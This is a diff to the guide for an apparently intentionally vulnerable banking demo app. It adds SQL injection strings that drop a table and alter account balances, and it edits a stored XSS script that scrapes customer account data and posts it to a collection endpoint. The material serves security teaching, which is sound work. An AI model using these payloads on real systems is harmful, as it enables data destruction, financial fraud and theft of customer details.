@@ -52,9 +52,11 @@ To exploit this vulnerability, log in as a customer and inject SQL into the firs
 
 For example:
 
-`' DROP TABLE customer; --`
+`'; DROP TABLE customer; --`
 
-`' UPDATE bank_account SET balance=999999999 WHERE customer_id=2; --`
+`'; UPDATE bank_account SET balance=999999999 WHERE customer_id=2; --`
+
+`Liz' where customer_id=2; UPDATE bank_account SET balance=0 WHERE account_id=1; UPDATE bank_account SET balance=900000000 where account_id=4; --`
 
 You may view the database by logging into the H2 console by clicking the link from the index page. The connection details are found in the application.properties file.
 
@@ -67,7 +69,7 @@ Defending against this vulnerability can be done at multiple levels
 
 To exploit this vulnerability, log in as a customer and inject the following javascript into the first name field as follows
 
-`<script type="text/javascript">$(document).ready(function(){var accountInfo="";$("table").children("tbody").children("tr").each(function(){$(this).children("td").each(function(){accountInfo=accountInfo+";"+$(this).text();});});$.post("http://localhost:8080/receive-hack", {accountInfo:accountInfo});});alert("hacked");</script>`
+`<script type="text/javascript">$(document).ready(function(){var accountInfo="";$("table").children("tbody").children("tr").each(function(){$(this).children("td").each(function(){accountInfo=accountInfo+";"+$(this).text();});});$.post("http://localhost:8080/receive-hack", {accountInfo:accountInfo});});alert("You have been hacked!");</script>`
 
 This attack will allow a malicious user to inject a script into the database that then will run on the employee level and expose customer details to another endpoint controlled by the malicious user. In this case, it is simply the same app server, but this would be different in a real attack.
 
